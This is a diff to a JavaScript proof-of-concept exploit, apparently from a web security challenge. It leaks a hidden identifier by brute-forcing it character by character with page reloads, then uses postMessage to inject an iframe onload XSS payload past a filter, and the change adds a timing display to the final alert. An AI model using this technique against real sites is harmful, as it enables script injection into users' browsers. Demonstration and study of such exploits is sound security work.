@@ -9,7 +9,7 @@
 <script>
   // add ~ to the alphabet so the poc works. without it, z would be never detected
   const alph = '0123456789abcdefghijklmnopqrstuvwxyz~'
-
+  const startTime = Date.now();
   // store current index and current identifier in sessionStorage
   let cur_char = parseInt(sessionStorage.getItem('current')) || 0;
   let cur_identifier = sessionStorage.getItem('identifier') || '';
@@ -54,12 +54,16 @@
     location.reload();
   }
 
-  // with leaked identifier execute full blown XSS
-  function solve(identifier) {
+    // once the identifier is leaked, use it to trigger full blown XSS
+    function solve(identifier) {
+        stop = true;
+        const pocTime = ((Date.now() - startTime) / 1000).toFixed(2);
         top.postMessage({
             type: 'waf',
             identifier,
-            str: `<iframe onload="alert(/this_is_flag/)">`,
+            str: `<iframe onload="
+                alert(\`Thanks for playing! \n ~terjanq \n\nPoC time: ${pocTime}s\`)
+                "></iframe>`,
             safe: true
         }, '*')
     }
